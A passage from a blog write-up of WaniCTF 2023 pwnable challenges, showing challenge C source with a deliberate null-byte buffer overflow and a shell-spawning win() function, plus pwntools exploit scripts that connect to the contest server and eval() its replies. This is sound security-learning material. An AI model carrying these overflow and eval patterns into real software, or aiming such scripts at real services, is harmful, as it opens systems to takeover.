<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Over this weekend i played WaniCTF it was beginner freindly CTF where i solved some challenges over there …………………… All challenges can be found here PwnablenetcatDescription -&gt; First, let’s challen">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF WriteUp: WaniCTF 2023">
<meta property="og:url" content="https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/index.html">
<meta property="og:site_name" content="sf4ult">
<meta property="og:description" content="Over this weekend i played WaniCTF it was beginner freindly CTF where i solved some challenges over there …………………… All challenges can be found here PwnablenetcatDescription -&gt; First, let’s challen">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post4/front.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post4/pwn/netcat.gif">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post4/pwn/canaleak_checksec.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post4/pwn/ret2libc_run.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post4/rev/just_password.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post4/rev/javersing.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post4/forensic/just_mp4.gif">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post4/forensic/whats_happening.gif">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post4/forensic/lowkey_messedup.png">
<meta property="og:image" content="https://sf4ult.github.io/lowkey_messedup_flag.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post4/misc/prompt_desc.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post4/misc/prompt.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post4/misc/prompt_flag.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post4/misc/promt_flag2.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post4/crypto/crypto1.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post4/crypto/crypto1.gif">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post4/web/web1.gif">
<meta property="article:published_time" content="2023-06-08T03:40:15.000Z">
<meta property="article:modified_time" content="2023-05-08T20:36:17.432Z">
<meta property="article:author" content="Durgesh">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="reversing">
<meta property="article:tag" content="misc">
<meta property="article:tag" content="forensic">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sf4ult.github.io/imgs/post4/front.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.png">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>CTF WriteUp: WaniCTF 2023</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 vazir">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archive">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/Durge5h/Projects">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/04/08/post3/ca_2023/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/&text=CTF WriteUp: WaniCTF 2023"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/&title=CTF WriteUp: WaniCTF 2023"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/&is_video=false&description=CTF WriteUp: WaniCTF 2023"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CTF WriteUp: WaniCTF 2023&body=Check out this article: https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/&title=CTF WriteUp: WaniCTF 2023"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/&title=CTF WriteUp: WaniCTF 2023"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/&title=CTF WriteUp: WaniCTF 2023"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/&title=CTF WriteUp: WaniCTF 2023"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/&name=CTF WriteUp: WaniCTF 2023&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/&t=CTF WriteUp: WaniCTF 2023"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwnable"><span class="toc-number">1.</span> <span class="toc-text">Pwnable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#netcat"><span class="toc-number">1.1.</span> <span class="toc-text">netcat</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description"><span class="toc-number">1.1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit"><span class="toc-number">1.1.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#only-once"><span class="toc-number">1.2.</span> <span class="toc-text">only once</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2win"><span class="toc-number">1.3.</span> <span class="toc-text">ret2win</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode-basic"><span class="toc-number">1.4.</span> <span class="toc-text">shellcode_basic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#beginners-ROP"><span class="toc-number">1.5.</span> <span class="toc-text">beginners ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-3"><span class="toc-number">1.5.1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#strategy"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">strategy</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-3"><span class="toc-number">1.5.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#canaleak"><span class="toc-number">1.6.</span> <span class="toc-text">canaleak</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-4"><span class="toc-number">1.6.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-4"><span class="toc-number">1.6.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc"><span class="toc-number">1.7.</span> <span class="toc-text">ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-5"><span class="toc-number">1.7.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-5"><span class="toc-number">1.7.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#time-table"><span class="toc-number">1.8.</span> <span class="toc-text">time table</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rev"><span class="toc-number">2.</span> <span class="toc-text">Rev</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Just-Passw0rd"><span class="toc-number">2.1.</span> <span class="toc-text">Just_Passw0rd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#javersing"><span class="toc-number">2.2.</span> <span class="toc-text">javersing</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solve"><span class="toc-number">2.2.1.</span> <span class="toc-text">solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fermat"><span class="toc-number">2.3.</span> <span class="toc-text">fermat</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Solve"><span class="toc-number">2.3.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#theseus"><span class="toc-number">2.4.</span> <span class="toc-text">theseus</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Solve-1"><span class="toc-number">2.4.1.</span> <span class="toc-text">Solve</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensic"><span class="toc-number">3.</span> <span class="toc-text">Forensic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Just-mp4"><span class="toc-number">3.1.</span> <span class="toc-text">Just_mp4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#whats-happening"><span class="toc-number">3.2.</span> <span class="toc-text">whats_happening</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lowkey-messedup"><span class="toc-number">3.3.</span> <span class="toc-text">lowkey_messedup</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Solve-2"><span class="toc-number">3.3.1.</span> <span class="toc-text">Solve</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">4.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Prompt"><span class="toc-number">4.1.</span> <span class="toc-text">Prompt</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-6"><span class="toc-number">4.1.1.</span> <span class="toc-text">Description</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">5.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EZDORSA-Lv1"><span class="toc-number">5.1.</span> <span class="toc-text">EZDORSA_Lv1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">6.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IndexedDB"><span class="toc-number">6.1.</span> <span class="toc-text">IndexedDB</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        CTF WriteUp: WaniCTF 2023
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Durgesh</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-06-08T03:40:15.000Z" class="dt-published" itemprop="datePublished">2023-06-08</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/forensic/" rel="tag">forensic</a>, <a class="p-category" href="/tags/misc/" rel="tag">misc</a>, <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>, <a class="p-category" href="/tags/reversing/" rel="tag">reversing</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p><img src="/imgs/post4/front.png" alt="front"></p>
<p>Over this weekend i played WaniCTF it was beginner freindly CTF where i solved some challenges over there ……………………</p>
<p>All challenges can be found <a target="_blank" rel="noopener" href="https://github.com/Durge5h/CTFs/tree/main/Competition/WaniCTF-2023">here</a></p>
<h2 id="Pwnable"><a href="#Pwnable" class="headerlink" title="Pwnable"></a>Pwnable</h2><h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><blockquote>
<p>-&gt; First, let’s challenge the displayed arithmetic problem.<br>-&gt; After clearing the arithmetic problem, a new shell will be launched. There is no need to panic even if nothing is displayed on the screen. Try entering a command you know (such as <code>ls</code> or <code>cat</code>).</p>
</blockquote>
<p>wasted more time than needed on this POS. thought, have to loop 100 times by evaluting the answer as it prompt “remaining 100 challenges” instead of manually answering the answer three time i wouldn’t if i have read hint given </p>
<p><img src="/imgs/post4/pwn/netcat.gif" alt="netcat"></p>
<h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote(&quot;netcat-pwn.wanictf.org&quot;,9001)</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process() </span></span><br><span class="line">r = remote(<span class="string">&quot;netcat-pwn.wanictf.org&quot;</span>,<span class="number">9001</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r.recvline()</span><br><span class="line">        r.recvline()</span><br><span class="line">        data = r.recv().decode()</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        equ = re.search(<span class="string">r&quot;\d+\s*\+\s*\d+&quot;</span>,data) </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;equ :&quot;</span>,equ)</span><br><span class="line">        ans = <span class="built_in">eval</span>(<span class="built_in">str</span>(equ.group()))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ans : &quot;</span>,ans)</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(ans).encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        r.interactive() </span><br></pre></td></tr></table></figure>

<h3 id="only-once"><a href="#only-once" class="headerlink" title="only once"></a>only once</h3><h4 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h4><blockquote>
<p>In the pwn category, it is common for the problem server to distribute executable files and their source code. How does it differ from the source code of “netcat”?</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">rand_gen</span><span class="params">()</span> &#123; <span class="keyword">return</span> rand() % <span class="number">1000</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  init();</span><br><span class="line">  srand((<span class="type">unsigned</span> <span class="type">int</span>)time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> x = rand_gen(), y = rand_gen();</span><br><span class="line">  <span class="type">int</span> score = <span class="number">0</span>, chall = <span class="number">1</span>;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n+---------------------------------------+\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;| your score: %d, remaining %d challenges |\n&quot;</span>, score, chall);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;+---------------------------------------+\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (chall == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Bye!\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%3d + %3d = &quot;</span>, x, y);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%8s&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">if</span> (atoi(buf) == x + y) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Cool!\n&quot;</span>);</span><br><span class="line">      score++;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Oops...\n&quot;</span>);</span><br><span class="line">      score = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (score &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Congrats!\n&quot;</span>);</span><br><span class="line">      win();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    x = rand_gen();</span><br><span class="line">    y = rand_gen();</span><br><span class="line">    chall--;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main workflow as follows </p>
<ul>
<li>ask answer of math equation </li>
<li>if answer is as expected increment the score by 1 and call the <code>win</code> function if <code>score &gt;=3 </code></li>
<li>if not nullify the socre </li>
<li>decrement the <code>char</code></li>
</ul>
<p>but here is one catch, program appears to have a buffer overflow vulnerability on the line <code>scanf(&quot;%8s&quot;, buf);</code>. If the user inputs a string longer than 8 characters, it will overflow the buffer and potentially overwrite adjacent memory location i.e. <code>char</code> variable here </p>
<p>so if you see <code>buf</code> has 8 byte length itself and function <code>scanf(&quot;%8s&quot;, buf)</code> allowing us to input 8 byte data on buf and as we know In C, strings are represented as arrays of characters terminated by a null byte (‘\0’) after 8 byte of user input null byte wii be overwritten to char variable so it is precisely null byte overflow </p>
<p>and because char is decrementing each time in loop it will  never match if condition i.e. <code>chall == 0</code>  e.g </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (c &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">    c--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re,os</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote(&quot;netcat-pwn.wanictf.org&quot;,9001)</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process() </span></span><br><span class="line">r = remote(<span class="string">&quot;netcat-pwn.wanictf.org&quot;</span>,<span class="number">9002</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;somedummyhere&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">	    r.recvline()</span><br><span class="line">	    r.recvline()</span><br><span class="line">	    data = r.recv().decode()</span><br><span class="line">	    <span class="built_in">print</span>(data)</span><br><span class="line">	    equ = re.search(<span class="string">r&quot;\d+\s*\+\s*\d+&quot;</span>,data) </span><br><span class="line">	    <span class="built_in">print</span>(<span class="string">&quot;equ :&quot;</span>,equ)</span><br><span class="line">	    ans = <span class="built_in">eval</span>(<span class="built_in">str</span>(equ.group()))</span><br><span class="line">	    <span class="built_in">print</span>(<span class="string">&quot;ans : &quot;</span>,ans)</span><br><span class="line"></span><br><span class="line">	    r.sendline(<span class="built_in">str</span>(ans).encode())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        r.interactive() </span><br></pre></td></tr></table></figure>


<h3 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h3><h4 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h4><blockquote>
<p>-&gt; When a new function is called in a program, the pointer to the currently executing instruction is temporarily stored in the stack area.By restoring the instruction pointer, also known as the return address, that was saved in the stack area after the function call, the program can continue execution from where it left off immediately after the function call.<br>-&gt; If you were able to overwrite the return address, you could jump to a free address in the program and execute instructions there. Could you take control of the shell by overwriting the return address that is restored after the main function ends with the address of the win function?</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span 